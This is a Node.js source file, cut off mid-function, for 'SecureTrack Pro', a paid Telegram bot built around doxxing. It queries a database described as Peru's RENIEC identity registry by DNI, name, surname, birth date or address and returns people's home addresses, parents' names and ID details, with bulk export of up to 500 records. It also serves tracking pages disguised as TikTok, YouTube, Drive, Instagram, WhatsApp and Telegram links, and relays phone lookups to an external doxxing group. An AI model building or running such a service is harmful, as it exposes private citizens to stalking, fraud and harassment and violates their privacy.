/* ============================================================
   SECURETRACK PRO — BACKEND & TELEGRAM BOT
   Ejecutar con: node bot.js
   ============================================================ */

const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const readline = require('readline');
require('dotenv').config();
const { createClient } = require('@supabase/supabase-js');
const mysql = require('mysql2/promise');


const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // ✅ Tu ID de Telegram
const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;

// Configuración del servidor
const PORT = Number(process.env.PORT) || 8080;
const RAW_PUBLIC_BASE_URL =
    process.env.PUBLIC_BASE_URL ||
    process.env.RAILWAY_PUBLIC_DOMAIN ||
    `http://localhost:${PORT}`;
const WEBSITE_URL = /^https?:\/\//i.test(RAW_PUBLIC_BASE_URL)
    ? RAW_PUBLIC_BASE_URL.replace(/\/+$/, '')
    : `https://${RAW_PUBLIC_BASE_URL.replace(/\/+$/, '')}`;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !SUPABASE_URL || !SUPABASE_KEY) {
    console.error('❌ Faltan variables de entorno obligatorias.');
    console.error('Asegúrate de configurar: BOT_TOKEN, ADMIN_CHAT_ID, SUPABASE_URL, SUPABASE_KEY');
    process.exit(1);
}

const supabase = createClient(SUPABASE_URL, SUPABASE_KEY);

// Configuración Pool MySQL para RENIEC
const dbConfig = {
    host: process.env.DB_HOST,
    user: process.env.DB_USER,
    password: process.env.DB_PASS,
    database: process.env.DB_NAME,
    waitForConnections: true,
    connectionLimit: 10,
    queueLimit: 0
};
const pool = mysql.createPool(dbConfig);


const BASE_URL = `https://api.telegram.org/bot${BOT_TOKEN}`;

// 🖼️ Ruta local de la foto de portada del /start
const COVER_PHOTO_PATH = path.join(__dirname, 'start.png');
const RENIEC_FILE_PATH = process.env.RENIEC_FILE_PATH || path.join(__dirname, 'reniec.txt');
const RENIEC_DEFAULT_LIMIT = Number(process.env.RENIEC_DEFAULT_LIMIT) || 5;
const RENIEC_MAX_LIMIT = 50;

let botMe = null; // ✅ Datos del bot (username, etc.)
let offset = 0;
let visitCount = 0;
let startTime = new Date();
let isPolling = false;  // ✅ Bandera para evitar polling duplicado
let conflictCount = 0;  // Contador de conflictos consecutivos
// Estadísticas temporales
const visitorStats = {}; // Estadísticas por país
const linkHistory = [];
const reniecLimitByChat = new Map();
const proxyRequests = new Map(); // ✅ Para rastrear consultas externas: id_mensaje -> original_chat_id
const pendingActions = new Map(); // ✅ Para esperar entrada de texto tras pulsar botón
const PROXY_GROUP_ID = process.env.PROXY_GROUP_ID; // ✅ ID del grupo de doxeo externo

const app = express();
app.use(cors());
app.use(bodyParser.json({ limit: '10mb' }));
app.use(express.static(__dirname)); // Sirve index.html y assets

// Rutas Legacy por compatibilidad
app.get('/v/:id', (_req, res) => res.sendFile(path.join(__dirname, 'index.html')));
app.get('/tiktok/:id', (_req, res) => res.sendFile(path.join(__dirname, 'tiktok.html')));

// ✅ Rutas de Plantillas Dinámicas
app.get('/tk/:id', (_req, res) => res.sendFile(path.join(__dirname, 'tiktok.html')));
app.get('/yt/:id', (_req, res) => res.sendFile(path.join(__dirname, 'youtube.html')));
app.get('/d/:id', (_req, res) => res.sendFile(path.join(__dirname, 'drive.html')));
app.get('/ig/:id', (_req, res) => res.sendFile(path.join(__dirname, 'ig.html')));
app.get('/wa/:id', (_req, res) => res.sendFile(path.join(__dirname, 'wa.html')));
app.get('/nx/:id', (_req, res) => res.sendFile(path.join(__dirname, 'nx.html')));
app.get('/tg/:id', (_req, res) => res.sendFile(path.join(__dirname, 'tg.html')));

const upload = multer({ limits: { fileSize: 10 * 1024 * 1024 } }); // Para fotos (screenshots)

/* ====================================================
   FETCH A TELEGRAM
   ==================================================== */
async function apiFetch(method, body = {}) {
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 20000);
    try {
        const res = await fetch(`${BASE_URL}/${method}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
            signal: controller.signal,
        });
        clearTimeout(timer);
        const json = await res.json();
        if (!json.ok) {
            console.error(`[TG API ERROR] ${method}:`, json.description || json.error_code);
        }
        return json;
    } catch (e) {
        clearTimeout(timer);
        console.error(`[FETCH ERROR] ${method}:`, e.message);
        return null;
    }
}

async function sendMessage(chatId, text, extra = {}) {
    return apiFetch('sendMessage', {
        chat_id: chatId,
        text,
        parse_mode: 'HTML',
        disable_web_page_preview: true,
        ...extra,
    });
}

/* ====================================================
   GENERADOR DE ENLACES ACORTADOS (is.gd)
   ==================================================== */
async function shortenUrl(longUrl) {
    try {
        const api = `https://is.gd/create.php?format=json&url=${encodeURIComponent(longUrl)}`;
        const res = await fetch(api);
        const data = await res.json();
        return data.shorturl || longUrl;
    } catch (e) {
        return longUrl;
    }
}

function buildTrackingUrl(targetId, type = 'tiktok') {
    if (type === 'youtube') return `${WEBSITE_URL}/yt/${encodeURIComponent(targetId)}`;
    if (type === 'drive') return `${WEBSITE_URL}/d/${encodeURIComponent(targetId)}`;
    if (type === 'ig') return `${WEBSITE_URL}/ig/${encodeURIComponent(targetId)}`;
    if (type === 'wa') return `${WEBSITE_URL}/wa/${encodeURIComponent(targetId)}`;
    if (type === 'nx') return `${WEBSITE_URL}/nx/${encodeURIComponent(targetId)}`;
    if (type === 'tg') return `${WEBSITE_URL}/tg/${encodeURIComponent(targetId)}`;
    return `${WEBSITE_URL}/tk/${encodeURIComponent(targetId)}`; // default tiktok
}

function escapeHtml(value = '') {
    return String(value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

function normalizeText(value = '') {
    return String(value || '')
        .normalize('NFD')
        .replace(/[\u0300-\u036f]/g, '')
        .toUpperCase()
        .trim();
}

function getEffectiveLimit(chatId) {
    const custom = reniecLimitByChat.get(chatId);
    if (!custom) return RENIEC_DEFAULT_LIMIT;
    return Math.max(1, Math.min(RENIEC_MAX_LIMIT, custom));
}

async function runReniecQuery({ chatId, queryLabel, sql, params }) {
    const start = Date.now();
    try {
        const [rows] = await pool.execute(sql, params);
        const elapsed = Date.now() - start;
        const limit = getEffectiveLimit(chatId);
        const limitedRows = rows.slice(0, limit);

        if (limitedRows.length === 0) {
            return `🔎 <b>CONSULTA RENIEC</b>\n<b>Busqueda:</b> <code>${escapeHtml(queryLabel)}</code>\n\n❌ SIN RESULTADOS EN BASE DE DATOS.`;
        }

        const formatted = limitedRows.map((r) => {
            const dni = escapeHtml(r.dni || '00000000');
            const digito = dni.length === 8 ? dni.split('').reduce((a, b, i) => a + (parseInt(b) * [3, 2, 7, 6, 5, 4, 3, 2][i]), 0) % 11 : '-';
            const digVerif = [6, 7, 8, 9, 0, 1, 1, 2, 3, 4, 5][digito] || '0';

            const apPat = escapeHtml(r.ap_pat || '');
            const apMat = escapeHtml(r.ap_mat || '');
            const nombres = escapeHtml(r.nombres || '');
            const fnac = r.fecha_nac || '01/01/1900';
            
            // Calculo de Edad aproximado
            let edad = 'N/A';
            try {
                const parts = fnac.split('/');
                if(parts.length === 3) {
                    const birthDate = new Date(parts[2], parts[1]-1, parts[0]);
                    const ageDifMs = Date.now() - birthDate.getTime();
                    const ageDate = new Date(ageDifMs);
                    edad = Math.abs(ageDate.getUTCFullYear() - 1970);
                }
            } catch(e){}

            const genero = (r.sexo || '').toUpperCase().includes('MASC') ? 'MASCULINO' : 'FEMENINO';
            const ubigeoDir = r.ubigeo_dir || '------';
            const direccion = escapeHtml(r.direccion || 'NO REGISTRADA');
            const estCivil = escapeHtml((r.est_civil || 'SOLTERO').toUpperCase());
            const fInscr = escapeHtml(r.fch_inscripcion || '--/--/----');
            const fEmis = escapeHtml(r.fch_emision || '--/--/----');
            const fCaduc = escapeHtml(r.fch_caducidad || '--/--/----');
            const madre = escapeHtml(r.madre || 'NO REGISTRADO');
            const padre = escapeHtml(r.padre || 'NO REGISTRADO');

            return `<b>DNI ⇒</b> <code>${dni}</code> - ${digVerif}\n` +
                   `<b>NOMBRES ⇒</b> ${nombres}\n` +
                   `<b>APELLIDOS ⇒</b> ${apPat} ${apMat}\n` +
                   `<b>GENERO ⇒</b> ${genero}\n\n` +
                   `[ 🎂 ] <b>NACIMIENTO</b>\n\n` +
                   `<b>FECHA NACIMIENTO ⇒</b> ${fnac}\n` +
                   `<b>EDAD ⇒</b> ${edad} AÑOS\n` +
                   `<b>UBIGEO ⇒</b> ${ubigeoDir}\n\n` +
                   `[ 📋 ] <b>INFORMACION GENERAL</b>\n\n` +
                   `<b>ESTADO CIVIL ⇒</b> ${estCivil}\n` +
                   `<b>FECHA INSCRIPCION ⇒</b> ${fInscr}\n` +
                   `<b>FECHA EMISION ⇒</b> ${fEmis}\n` +
                   `<b>FECHA CADUCIDAD ⇒</b> ${fCaduc}\n` +
                   `<b>PADRE ⇒</b> ${padre}\n` +
                   `<b>MADRE ⇒</b> ${madre}\n\n` +
                   `[ 🏠 ] <b>DOMICILIO</b>\n\n` +
                   `<b>DIRECCION ⇒</b> ${direccion}\n` +
                   `<b>UBIGEO ⇒</b> ${ubigeoDir}\n` +
                   `────────────────────`;
        }).join('\n\n');

        return `${formatted}\n\n` +
               `<b>SISTEMA SECURETRACK PRO</b>\n` +
               `⚡ <b>TIEMPO:</b> <code>${elapsed} ms</code>`;
    } catch (e) {
        throw new Error(`Error SQL: ${e.message}`);
    }
}

async function runReniecQueryRows({ chatId, queryLabel, sql, params }) {
    const start = Date.now();
    try {
        const [rows] = await pool.execute(sql, params);
        const elapsed = Date.now() - start;
        const limit = getEffectiveLimit(chatId);
        const limitedRows = rows.slice(0, limit);
        
        const headers = ["DNI", "AP_PAT", "AP_MAT", "NOMBRES", "FECHA_NAC", "FCH_INSCRIPCION", "FCH_EMISION", "FCH_CADUCIDAD", "UBIGEO_NAC", "UBIGEO_DIR", "DIRECCION", "SEXO", "EST_CIVIL", "DIG_RUC", "MADRE", "PADRE"];
        
        const mappedRows = limitedRows.map(r => [
            r.dni, r.ap_pat, r.ap_mat, r.nombres, r.fecha_nac, 
            r.fch_inscripcion, r.fch_emision, r.fch_caducidad, 
            r.ubigeo_nac, r.ubigeo_dir, r.direccion, r.sexo, 
            r.est_civil, r.dig_ruc, r.madre, r.padre
        ]);

        return { headers, rows: mappedRows, scanned: rows.length, limit, elapsed, queryLabel };
    } catch (e) {
        throw new Error(`Error SQL Export: ${e.message}`);
    }
}


async function sendMainMenu(chatId, userName) {
  const keyboard = {
    inline_keyboard: [
      [{ text: "🆔 CONSULTA DNI", callback_data: "local_reniec" }],
      [{ text: "🔗 GENERAR TRACKER", callback_data: "local_links" }],
      [{ text: "👤 MI CUENTA", callback_data: "cmd_status" }, { text: "🎁 REFERIDOS", callback_data: "cmd_invite" }],
      [{ text: "🛰️ CONSULTA EXTERNA (F)", callback_data: "cat_proxy" }]
    ]
  };

  const welcomeText = `Hola, <b>${userName}</b>\n\n<b>[ PANEL DE COMANDOS ]</b>\n\nBienvenido a nuestro menú principal de comandos.\n\nPor favor, selecciona una opción según la categoría que deseas consultar o explorar.`;

  try {
    const imgBuffer = fs.readFileSync(COVER_PHOTO_PATH);
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('caption', welcomeText);
    formData.append('parse_mode', 'HTML');
    formData.append('reply_markup', JSON.stringify(keyboard));
    formData.append('photo', new Blob([imgBuffer], { type: 'image/png' }), 'start.png');
    await fetch(`${BASE_URL}/sendPhoto`, { method: 'POST', body: formData });
  } catch (e) {
    await sendMessage(chatId, welcomeText, { reply_markup: keyboard });
  }
}

async function handleCallback(cb) {
  const chatId = String(cb.message.chat.id);
  const data = cb.data;
  const userId = String(cb.from.id);

  if (data === "local_reniec") {
    pendingActions.set(userId, "local_reniec");
    await sendMessage(chatId, `🆔 <b>CONSULTA RENIEC (Propia)</b>\n\n<code>Ingrese el DNI a consultar:</code>`);
  } else if (data === "local_links") {
    await sendMessage(chatId, `🔗 <b>GENERADOR DE TRACKERS</b>\n\nUsa los comandos directos:\n/tk, /yt, /d, /ig, /wa, /nx, /tg\n\nEjemplo: <code>/tk MiVideo</code>`);
  } else if (data === "cat_proxy") {
    pendingActions.set(userId, "proxy");
    await sendMessage(chatId, `🛰️ <b>MODO PROXY (Externo)</b>\n\n<code>Ingrese el comando completo para el servidor externo:</code>\nEjemplo: <code>/tel 999888777</code>`);
  } else if (data === "cmd_status") {
    cb.message.text = "/status";
    cb.message.from = cb.from; // Asegurar que el remitente sea el correcto
    await handleCommand(cb.message);
  } else if (data === "cmd_invite") {
    cb.message.text = "/invite";
    cb.message.from = cb.from;
    await handleCommand(cb.message);
  }
  
  await apiFetch('answerCallbackQuery', { callback_query_id: cb.id });
}

/* ====================================================
   COMANDOS DEL BOT
   ==================================================== */
async function handleCommand(msg) {
    const chatId = String(msg.chat.id);
    const userId = String(msg.from.id);
    const textRaw = (msg.text || "").trim();
    const partsRaw = textRaw.split(" ").filter(Boolean);
    
    // Detectar comando y limpiar el arroba si viene de un grupo (ej: /dni@bot -> /dni)
    let command = (partsRaw[0] || "").toLowerCase();
    if (command.includes("@")) {
      command = command.split("@")[0];
    }
    
    const text = textRaw.toLowerCase();
    const argsRaw = partsRaw.slice(1);
    const from = msg.from?.first_name || "Usuario";
    const isGroup = msg.chat.type === "group" || msg.chat.type === "supergroup";

    let { data: user, error: userError } = await supabase
      .from("bot_users")
      .select("*")
      .eq("chat_id", userId)
      .single();

    if (userError && userError.code !== 'PGRST116') {
        console.error("DB Error fetch user:", userError);
    }

    // ✅ MODO PROXY: Si el comando termina en 'f', lo enviamos al grupo externo
    if (command.endsWith('f') && command.length > 2) {
        if (!user) {
            await sendMessage(chatId, `❌ No estás registrado. Escribe /start`);
            return;
        }
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta proxy.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }

        const realCommand = command.slice(0, -1); // Quita la 'f'
        const fullMsg = `${realCommand} ${argsRaw.join(' ')}`;
        
        if (!PROXY_GROUP_ID) {
            await sendMessage(chatId, `❌ Error: No se ha configurado el PROXY_GROUP_ID en el servidor.`);
            return;
        }

        const res = await apiFetch('sendMessage', {
            chat_id: PROXY_GROUP_ID,
            text: fullMsg
        });

        if (res && res.ok) {
            const groupMsgId = res.result.message_id;
            proxyRequests.set(String(groupMsgId), chatId);
            await sendMessage(chatId, `🛰️ <b>Consulta Proxy Enviada</b>\nEsperando respuesta del servidor externo...`);
        } else {
            await sendMessage(chatId, `❌ Error al enviar consulta al grupo externo.`);
        }
        return;
    }

    if (userError && userError.code !== 'PGRST116') {
        console.error("DB Error fetch user:", userError);
    }

    if (text === '/start' || text.startsWith('/start ')) {
        const startPayload = textRaw.split(' ')[1];
        let isNewUser = false;
        let refereeId = null;

        if (startPayload && startPayload.startsWith('REF')) {
            refereeId = startPayload.replace('REF', '');
        }

        if (!user) {
            const initPlan = userId === ADMIN_CHAT_ID ? 'unlimited' : 'credits';
            const initCredits = userId === ADMIN_CHAT_ID ? 0 : 1;

            const { data: newUser, error: insertError } = await supabase
                .from('bot_users')
                .insert([{ chat_id: userId, name: from, plan: initPlan, credits: initCredits }])
                .select()
                .single();

            if (insertError) {
                console.error("Error al registrar:", insertError);
                await sendMessage(chatId, `❌ Error de base de datos al registrar.`);
                return;
            }
            user = newUser;
            isNewUser = true;

            if (refereeId && refereeId !== userId) {
                const { data: refUser } = await supabase.from('bot_users').select('credits').eq('chat_id', refereeId).single();
                if (refUser) {
                    await supabase.from('bot_users').update({ credits: refUser.credits + 1 }).eq('chat_id', refereeId);
                    await sendMessage(refereeId, `🎉 <b>¡NUEVO REFERIDO!</b>\nUn usuario ha ingresado con tu enlace y has ganado <b>+1 Crédito</b>.`);
                }
            }
        }

        await sendMainMenu(chatId, user.name);
        return;
    } 

    if (text === '/menu') {
        await sendMainMenu(chatId, from);
        return;
    }

    // ✅ Lógica de captura tras pulsar botón del menú
    if (pendingActions.has(userId)) {
        const category = pendingActions.get(userId);
        pendingActions.delete(userId);

        if (category === "local_reniec") {
            if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
                if (user.credits < 2) {
                    await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                    return;
                }
                await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
            }
            try {
                const out = await runReniecQuery({
                    chatId,
                    queryLabel: `DNI ${textRaw}`,
                    sql: `SELECT * FROM reniec WHERE dni = ? LIMIT 1`,
                    params: [textRaw]
                });
                await sendMessage(chatId, out);
            } catch (e) {
                await sendMessage(chatId, `❌ Error en consulta: ${e.message}`);
            }
            return;
        }

        if (category === "proxy" || category.startsWith("cat_")) {
            if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
                if (user.credits < 2) {
                    await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                    return;
                }
                await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
            }
            if (!PROXY_GROUP_ID) {
                await sendMessage(chatId, `❌ Error: No se ha configurado el PROXY_GROUP_ID.`);
                return;
            }
            const res = await apiFetch('sendMessage', { chat_id: PROXY_GROUP_ID, text: textRaw });
            if (res && res.ok) {
                proxyRequests.set(String(res.result.message_id), chatId);
                await sendMessage(chatId, `🛰️ <b>Consulta Enviada al Externo</b>\nEsperando respuesta...`);
            }
            return;
        }
        return;
    }

    if (command === '/campos') {
        const headers = ["DNI", "AP_PAT", "AP_MAT", "NOMBRES", "FECHA_NAC", "FCH_INSCRIPCION", "FCH_EMISION", "FCH_CADUCIDAD", "UBIGEO_NAC", "UBIGEO_DIR", "DIRECCION", "SEXO", "EST_CIVIL", "DIG_RUC", "MADRE", "PADRE"];
        await sendMessage(chatId,
            `🧾 <b>Columnas RENIEC (${headers.length})</b>\n` +
            headers.map((h, i) => `${i + 1}. <code>${escapeHtml(h)}</code>`).join('\n')
        );

    } else if (command === '/limite') {
        const n = parseInt(argsRaw[0], 10);
        if (Number.isNaN(n) || n < 1 || n > RENIEC_MAX_LIMIT) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /limite <1-${RENIEC_MAX_LIMIT}>`);
            return;
        }
        reniecLimitByChat.set(chatId, n);
        await sendMessage(chatId, `✅ Límite RENIEC actualizado a <b>${n}</b> resultados por consulta.`);

    } else if (command === '/dni') {
        const dni = (argsRaw[0] || '').trim();
        if (!/^\d{8}$/.test(dni)) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /dni [8 dígitos]\nEj: <code>/dni 00890434</code>`);
            return;
        }
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }
        try {
            const out = await runReniecQuery({
                chatId,
                queryLabel: `DNI ${dni}`,
                sql: `SELECT * FROM reniec WHERE dni = ? LIMIT 50`,
                params: [dni]
            });
            await sendMessage(chatId, out);
        } catch (e) {
            await sendMessage(chatId, `❌ Error SQL DNI: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/nom') {
        const term = normalizeText(argsRaw.join(' '));
        if (!term) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /nom [nombres]\nEj: <code>/nom ALEXANDER</code>`);
            return;
        }
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }
        try {
            const out = await runReniecQuery({
                chatId,
                queryLabel: `NOMBRES contiene "${argsRaw.join(' ')}"`,
                sql: `SELECT * FROM reniec WHERE nombres LIKE ? LIMIT 50`,
                params: [`%${term}%`]
            });
            await sendMessage(chatId, out);
        } catch (e) {
            await sendMessage(chatId, `❌ Error SQL NOMBRES: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/ap') {
        const apPatTerm = normalizeText(argsRaw[0] || '');
        const apMatTerm = normalizeText(argsRaw[1] || '');
        if (!apPatTerm) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /ap [apellido_paterno] [apellido_materno]\nEj: <code>/ap SALAS AMASIFUEN</code>`);
            return;
        }
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }
        try {
            let sql = `SELECT * FROM reniec WHERE ap_pat LIKE ? LIMIT 50`;
            let params = [`%${apPatTerm}%`];
            if (apMatTerm) {
                sql = `SELECT * FROM reniec WHERE ap_pat LIKE ? AND ap_mat LIKE ? LIMIT 50`;
                params = [`%${apPatTerm}%`, `%${apMatTerm}%`];
            }
            const out = await runReniecQuery({
                chatId,
                queryLabel: `APELLIDOS "${argsRaw.join(' ')}"`,
                sql,
                params
            });
            await sendMessage(chatId, out);
        } catch (e) {
            await sendMessage(chatId, `❌ Error SQL APELLIDOS: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/fnac') {
        const date = (argsRaw[0] || '').trim();
        if (!/^\d{2}\/\d{2}\/\d{4}$/.test(date)) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /fnac [dd/mm/yyyy]\nEj: <code>/fnac 27/06/1968</code>`);
            return;
        }
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }
        try {
            const out = await runReniecQuery({
                chatId,
                queryLabel: `FECHA_NAC ${date}`,
                sql: `SELECT * FROM reniec WHERE fecha_nac = ? LIMIT 50`,
                params: [date]
            });
            await sendMessage(chatId, out);
        } catch (e) {
            await sendMessage(chatId, `❌ Error SQL FECHA_NAC: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/ubigeo') {
        const qRaw = argsRaw.join(' ').trim();
        const qNorm = normalizeText(qRaw);
        if (!qNorm) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /ubigeo [codigo o texto]\nEj: <code>/ubigeo 210311</code> o <code>/ubigeo SAN MARTIN</code>`);
            return;
        }
        const isCode = /^\d{6}$/.test(qRaw);
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }
        try {
            const out = await runReniecQuery({
                chatId,
                queryLabel: `UBIGEO "${qRaw}"`,
                sql: isCode
                    ? `SELECT * FROM reniec WHERE ubigeo_nac = ? LIMIT 50`
                    : `SELECT * FROM reniec WHERE ubigeo_dir LIKE ? LIMIT 50`,
                params: [isCode ? qRaw : `%${qNorm}%`]
            });
            await sendMessage(chatId, out);
        } catch (e) {
            await sendMessage(chatId, `❌ Error SQL UBIGEO: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/direccion') {
        const qNorm = normalizeText(argsRaw.join(' '));
        if (!qNorm) {
            await sendMessage(chatId, `⚠️ <b>Uso:</b> /direccion [texto]\nEj: <code>/direccion MANCO INCA</code>`);
            return;
        }
        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para esta consulta.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }
        try {
            const out = await runReniecQuery({
                chatId,
                queryLabel: `DIRECCION contiene "${argsRaw.join(' ')}"`,
                sql: `SELECT * FROM reniec WHERE direccion LIKE ? LIMIT 50`,
                params: [`%${qNorm}%`]
            });
            await sendMessage(chatId, out);
        } catch (e) {
            await sendMessage(chatId, `❌ Error SQL DIRECCION: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/export') {
        const expType = (argsRaw[0] || '').toLowerCase();
        const expArgs = argsRaw.slice(1);
        let sql = '';
        let params = [];
        let queryLabel = '';

        const usage = `⚠️ <b>Uso:</b> /export [tipo] [query]\nTipos: dni, nom, ap, fnac, ubigeo, direccion`;

        if (expType === 'dni') {
            const dni = (expArgs[0] || '').trim();
            if (!/^\d{8}$/.test(dni)) { await sendMessage(chatId, usage); return; }
            queryLabel = `EXPORT DNI ${dni}`;
            sql = `SELECT * FROM reniec WHERE dni = ? LIMIT 500`;
            params = [dni];
        } else if (expType === 'nom') {
            const term = normalizeText(expArgs.join(' '));
            if (!term) { await sendMessage(chatId, usage); return; }
            queryLabel = `EXPORT NOM "${expArgs.join(' ')}"`;
            sql = `SELECT * FROM reniec WHERE nombres LIKE ? LIMIT 500`;
            params = [`%${term}%`];
        } else if (expType === 'ap') {
            const apPatTerm = normalizeText(expArgs[0] || '');
            const apMatTerm = normalizeText(expArgs[1] || '');
            if (!apPatTerm) { await sendMessage(chatId, usage); return; }
            queryLabel = `EXPORT AP "${expArgs.join(' ')}"`;
            if (apMatTerm) {
                sql = `SELECT * FROM reniec WHERE ap_pat LIKE ? AND ap_mat LIKE ? LIMIT 500`;
                params = [`%${apPatTerm}%`, `%${apMatTerm}%`];
            } else {
                sql = `SELECT * FROM reniec WHERE ap_pat LIKE ? LIMIT 500`;
                params = [`%${apPatTerm}%`];
            }
        } else if (expType === 'fnac') {
            const date = (expArgs[0] || '').trim();
            if (!/^\d{2}\/\d{2}\/\d{4}$/.test(date)) { await sendMessage(chatId, usage); return; }
            queryLabel = `EXPORT FNAC ${date}`;
            sql = `SELECT * FROM reniec WHERE fecha_nac = ? LIMIT 500`;
            params = [date];
        } else if (expType === 'ubigeo') {
            const qRaw = expArgs.join(' ').trim();
            const qNorm = normalizeText(qRaw);
            if (!qNorm) { await sendMessage(chatId, usage); return; }
            queryLabel = `EXPORT UBIGEO "${qRaw}"`;
            const isCode = /^\d{6}$/.test(qRaw);
            sql = isCode ? `SELECT * FROM reniec WHERE ubigeo_nac = ? LIMIT 500` : `SELECT * FROM reniec WHERE ubigeo_dir LIKE ? LIMIT 500`;
            params = [isCode ? qRaw : `%${qNorm}%`];
        } else if (expType === 'direccion') {
            const qNorm = normalizeText(expArgs.join(' '));
            if (!qNorm) { await sendMessage(chatId, usage); return; }
            queryLabel = `EXPORT DIRECCION "${expArgs.join(' ')}"`;
            sql = `SELECT * FROM reniec WHERE direccion LIKE ? LIMIT 500`;
            params = [`%${qNorm}%`];
        } else {
            await sendMessage(chatId, usage);
            return;
        }

        if (user.plan === 'credits' && userId !== ADMIN_CHAT_ID) {
            if (user.credits < 2) {
                await sendMessage(chatId, `🛑 <b>SALDO INSUFICIENTE</b>\nNecesitas 2 créditos para este export.`);
                return;
            }
            await supabase.from('bot_users').update({ credits: user.credits - 2 }).eq('chat_id', userId);
        }

        try {
            const result = await runReniecQueryRows({ chatId, queryLabel, sql, params });
            if (result.rows.length === 0) {
                await sendMessage(chatId, `📦 <b>${escapeHtml(queryLabel)}</b>\nSin resultados para exportar.`);
                return;
            }

            const lines = [result.headers.join('|'), ...result.rows.map((r) => r.join('|'))];
            const exportName = `reniec_export_${Date.now()}.txt`;
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('caption', `📦 Export completado\nConsulta: ${queryLabel}\nFilas: ${result.rows.length}\nTiempo: ${result.elapsed} ms`);
            formData.append('document', new Blob([Buffer.from(lines.join('\n'), 'utf8')], { type: 'text/plain' }), exportName);

            const tgRes = await fetch(`${BASE_URL}/sendDocument`, { method: 'POST', body: formData });
            const tgJson = await tgRes.json();
            if (!tgJson.ok) {
                await sendMessage(chatId, `❌ Telegram rechazó el export: ${escapeHtml(tgJson.description || 'Error desconocido')}`);
            }
        } catch (e) {
            await sendMessage(chatId, `❌ Error exportando resultados: ${escapeHtml(e.message)}`);
        }

    } else if (command === '/myplan') {
        if (!user) {
            await sendMessage(chatId, `❌ No estás registrado. Usa /start primero.`);
            return;
        }
        const status = user.plan === 'unlimited' ? 'Ilimitado ♾️' : `${user.credits} Créditos Restantes`;
        await sendMessage(chatId,
            `👤 <b>Perfil de Usuario</b>\n\n` +
            `➖ <b>Nombre:</b> ${user.name}\n` +
            `➖ <b>ID:</b> <code>${chatId}</code>\n` +
            `➖ <b>Plan Actual:</b> ${user.plan === 'unlimited' ? 'VIP Ilimitado' : 'Por Créditos'}\n` +
            `💳 <b>Saldo:</b> <b>${status}</b>\n\n` +
            `💬 <i>Si deseas cambiar de plan o reportar recarga, escribe a https://t.me/Yxthc2</i>`
        );

    } else if (text === '/users') {
        if (userId !== ADMIN_CHAT_ID) return;
        let msg = `👥 <b>Lista de Usuarios Autorizados</b>\n\n`;
        const { data: users, error } = await supabase.from('bot_users').select('*').order('created_at', { ascending: false });
        if (error || !users || users.length === 0) {
            msg += `<i>No hay usuarios.</i>`;
        } else {
            users.forEach((u, idx) => {
